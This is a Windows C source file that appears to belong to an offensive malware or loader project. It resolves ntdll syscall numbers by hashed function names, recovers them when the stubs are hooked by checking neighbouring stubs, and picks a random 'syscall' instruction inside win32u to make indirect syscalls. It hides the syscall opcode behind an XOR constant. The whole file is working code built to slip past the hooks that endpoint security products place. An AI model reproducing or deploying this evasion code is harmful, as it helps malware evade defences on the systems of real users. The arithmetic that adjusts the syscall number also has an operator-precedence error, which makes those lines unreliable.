#include <Windows.h>

#include "Debug.h"
#include "Structs.h"
#include "Common.h"

#define SYSCALL_STUB_SIZE	0x20
#define UP	(-1 * SYSCALL_STUB_SIZE)
#define DOWN SYSCALL_STUB_SIZE
#define SEARCH_RANGE	    0xFF

#define MOV1_SYSCALL_OPCODE	0x4C
#define R10_SYSCALL_OPCODE	0x8B
#define RCX_SYSCALL_OPCODE	0xD1
#define MOV2_SYSCALL_OPCODE	0xB8
#define JMP_SYSCALL_OPCODE	0xE9

#define RET_SYSCALL_OPCODE	0XC3

// Unknown purpose global variable
volatile unsigned short g_SYSCALL_OPCODE = 0x052A;

// Structure to hold module configuration
typedef struct _MODULE_CONFIG
{
	PDWORD		pdwArrayOfAddresses;	// [BaseAddress + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]		DLL Exported function Addresses VA
	PDWORD		pdwArrayOfNames;		// [BaseAddress + IMAGE_EXPORT_DIRECTORY.AddressOfNames]			DLL Exported function Name VA
	PWORD		pwArrayOfOrdinals;		// [BaseAddress + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]		DLL Exported function ordinals VA
	DWORD		dwNumberOfNames;		// [IMAGE_EXPORT_DIRECTORY.NumberOfNames]							DLL Exported function number
	ULONG_PTR	uModule;				// [BaseAddress]													The base address of DLL
	
	BOOLEAN		bInitialized;			// Initialization flag

} MODULE_CONFIG, * PMODULE_CONFIG;

// Global configurations for ntdll and win32u
MODULE_CONFIG	g_NtdllConfig = { 0 };
MODULE_CONFIG	g_Win32uConfig = { 0 };

// Function to initialize DLL configuration structures
BOOL InitialDllsConfigStructs(OUT PMODULE_CONFIG pModuleConfig, IN ULONG_PTR uBaseAddress)
{
	if (!pModuleConfig || !uBaseAddress) {
		return FALSE;
	}

	memset(pModuleConfig, 0, sizeof(MODULE_CONFIG));
	
	pModuleConfig->uModule = uBaseAddress;
	
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)uBaseAddress;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	PIMAGE_NT_HEADERS pImgNthdrs = (PIMAGE_NT_HEADERS)(uBaseAddress + pDosHeader->e_lfanew);
	if (pImgNthdrs->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	if (pImgNthdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) {
		return FALSE;
	}

	PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uBaseAddress + 
		pImgNthdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	if (!pImgExpDir->NumberOfNames || 
		!pImgExpDir->AddressOfFunctions ||
		!pImgExpDir->AddressOfNames ||
		!pImgExpDir->AddressOfNameOrdinals) {
		return FALSE;
	}

	pModuleConfig->dwNumberOfNames     = pImgExpDir->NumberOfNames;
	pModuleConfig->pdwArrayOfAddresses = (PDWORD)(uBaseAddress + pImgExpDir->AddressOfFunctions);
	pModuleConfig->pdwArrayOfNames     = (PDWORD)(uBaseAddress + pImgExpDir->AddressOfNames);
	pModuleConfig->pwArrayOfOrdinals   = (PWORD)(uBaseAddress + pImgExpDir->AddressOfNameOrdinals);

	pModuleConfig->bInitialized = TRUE;

	return TRUE;
}

// Function to fetch a random syscall address from win32u
BOOL FetchWin32uSyscall(OUT PVOID* ppSyscallRandomAddress)
{
	int SEED     = GernerateRandomInt() % 0x10;
	int iCounter = 0x00;

	if (!g_Win32uConfig.bInitialized) {
		if (!InitialDllsConfigStructs(&g_Win32uConfig, GetModuleHandleH(win32udll_CH))) {
			return FALSE;
		}
	}

	for (DWORD i = 0; i < g_Win32uConfig.dwNumberOfNames; i++) {

		PCHAR pcFuncName = (PCHAR)(g_Win32uConfig.uModule + g_Win32uConfig.pdwArrayOfNames[i]);
		PVOID pFuncAddress = (PVOID)(g_Win32uConfig.uModule + g_Win32uConfig.pdwArrayOfAddresses[g_Win32uConfig.pwArrayOfOrdinals[i]]);

		for (DWORD ii = 0; ii < SYSCALL_STUB_SIZE; ii++) {

			// Search for 'syscall' instruction
			// 'g_SYSCALL_OPCODE' is 0x050F ^ 0x25, thus XOR'ing it with 0x25 now
			// The 'unsigned short' data type is 2 bytes in size, which is the same size of the syscall opcode (0x050F)
			if (*(unsigned short*)((ULONG_PTR)pFuncAddress + ii) == (g_SYSCALL_OPCODE ^ 0x25) && *(BYTE*)((ULONG_PTR)pFuncAddress + ii + sizeof(unsigned short)) == RET_SYSCALL_OPCODE) {
				// Used to determine a random 'syscall' instruction address
				if (iCounter == SEED) {
					*ppSyscallRandomAddress = (PVOID)((ULONG_PTR)pFuncAddress + ii);  // Return only when we are at the iSeed'th syscall
					break;
				}

				iCounter++;
			}
		}

		if (*ppSyscallRandomAddress)
			return TRUE;
	}

	return FALSE;
}

// Function to fetch a syscall from ntdll based on a hash
BOOL FetchLamiaSyscall(IN DWORD dwSysHash, OUT PLAMIA_SYSCALL pNtSys)
{
	if (!pNtSys) {
		return FALSE;
	}

	if (!g_NtdllConfig.bInitialized || 
		!g_NtdllConfig.pdwArrayOfAddresses ||
		!g_NtdllConfig.pdwArrayOfNames ||
		!g_NtdllConfig.pwArrayOfOrdinals ||
		!g_NtdllConfig.uModule) {
		
		if (!InitialDllsConfigStructs(&g_NtdllConfig, GetModuleHandleH(ntdlldll_CH))) {
			return FALSE;
		}
		
		if (!g_NtdllConfig.pdwArrayOfAddresses || 
			!g_NtdllConfig.pdwArrayOfNames ||
			!g_NtdllConfig.pwArrayOfOrdinals ||
			!g_NtdllConfig.uModule) {
			return FALSE;
		}
	}

#ifdef DEBUG
	PRINT("uModule: %p\n", g_NtdllConfig.uModule);
	PRINT("pdwArrayOfAddresses: %p\n", g_NtdllConfig.pdwArrayOfAddresses);
	PRINT("pwArrayOfOrdinals: %p\n", g_NtdllConfig.pwArrayOfOrdinals);
	PRINT("dwNumberOfNames: %d\n", g_NtdllConfig.dwNumberOfNames);
#endif // DEBUG

	pNtSys->SyscallHash = dwSysHash;
	if (dwSysHash == 0) {
		return FALSE;
	}

	for (DWORD i = 0; i < g_NtdllConfig.dwNumberOfNames; i++)
	{
		PCHAR pcFuncName = (PCHAR)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfNames[i]);
		PVOID pFuncAddress = (PVOID)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfAddresses[g_NtdllConfig.pwArrayOfOrdinals[i]]);

		// If syscall hash value found
		DWORD cmpHash = CHASH(pcFuncName);
		if (cmpHash == dwSysHash) {

			// The syscall is not hooked
			if (*((PBYTE)pFuncAddress) == MOV1_SYSCALL_OPCODE
				&& *((PBYTE)pFuncAddress + 1) == R10_SYSCALL_OPCODE
				&& *((PBYTE)pFuncAddress + 2) == RCX_SYSCALL_OPCODE
				&& *((PBYTE)pFuncAddress + 3) == MOV2_SYSCALL_OPCODE
				&& *((PBYTE)pFuncAddress + 6) == 0x00
				&& *((PBYTE)pFuncAddress + 7) == 0x00) {

				BYTE    high = *((PBYTE)pFuncAddress + 5);
				BYTE    low = *((PBYTE)pFuncAddress + 4);
				pNtSys->SSN = (high << 8) | low;
				break; // break for-loop [i]
			}

			// If hooked - scenario 1
			if (*((PBYTE)pFuncAddress) == JMP_SYSCALL_OPCODE) {

				for (WORD idx = 1; idx <= SEARCH_RANGE; idx++) {
					// check neighboring syscall down
					if (*((PBYTE)pFuncAddress + idx * DOWN) == MOV1_SYSCALL_OPCODE
						&& *((PBYTE)pFuncAddress + 1 + idx * DOWN) == R10_SYSCALL_OPCODE
						&& *((PBYTE)pFuncAddress + 2 + idx * DOWN) == RCX_SYSCALL_OPCODE
						&& *((PBYTE)pFuncAddress + 3 + idx * DOWN) == MOV2_SYSCALL_OPCODE
						&& *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
						&& *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

						BYTE    high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
						BYTE    low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
						pNtSys->SSN = (high << 8) | low - idx;
						break; // break for-loop [idx]
					}
					// check neighboring syscall up
					if (*((PBYTE)pFuncAddress + idx * UP) == MOV1_SYSCALL_OPCODE
						&& *((PBYTE)pFuncAddress + 1 + idx * UP) == R10_SYSCALL_OPCODE
						&& *((PBYTE)pFuncAddress + 2 + idx * UP) == RCX_SYSCALL_OPCODE
						&& *((PBYTE)pFuncAddress + 3 + idx * UP) == MOV2_SYSCALL_OPCODE
						&& *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
						&& *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

						BYTE    high = *((PBYTE)pFuncAddress + 5 + idx * UP);
						BYTE    low = *((PBYTE)pFuncAddress + 4 + idx * UP);
						pNtSys->SSN = (high << 8) | low + idx;
						break; // break for-loop [idx]
					}
				}

			}

			// if hooked - scenario 2
			if (*((PBYTE)pFuncAddress + 3) == JMP_SYSCALL_OPCODE) {

				for (WORD idx = 1; idx <= SEARCH_RANGE; idx++) {
					// check neighboring syscall down
					if (*((PBYTE)pFuncAddress + idx * DOWN) == MOV1_SYSCALL_OPCODE
						&& *((PBYTE)pFuncAddress + 1 + idx * DOWN) == R10_SYSCALL_OPCODE
						&& *((PBYTE)pFuncAddress + 2 + idx * DOWN) == RCX_SYSCALL_OPCODE
						&& *((PBYTE)pFuncAddress + 3 + idx * DOWN) == MOV2_SYSCALL_OPCODE
						&& *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
						&& *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

						BYTE    high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
						BYTE    low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
						pNtSys->SSN = (high << 8) | low - idx;
						break; // break for-loop [idx]
					}
					// check neighboring syscall up
					if (*((PBYTE)pFuncAddress + idx * UP) == MOV1_SYSCALL_OPCODE
						&& *((PBYTE)pFuncAddress + 1 + idx * UP) == R10_SYSCALL_OPCODE
						&& *((PBYTE)pFuncAddress + 2 + idx * UP) == RCX_SYSCALL_OPCODE
						&& *((PBYTE)pFuncAddress + 3 + idx * UP) == MOV2_SYSCALL_OPCODE
						&& *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
						&& *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

						BYTE    high = *((PBYTE)pFuncAddress + 5 + idx * UP);
						BYTE    low = *((PBYTE)pFuncAddress + 4 + idx * UP);
						pNtSys->SSN = (high << 8) | low + idx;
						break; // break for-loop [idx]
					}
				}
			}
			break; // break for-loop [i]
		}
	}

	if (pNtSys->SSN == NULL) {
		return FALSE;
	}

	return FetchWin32uSyscall(&pNtSys->pSyscallRandomAdr);
}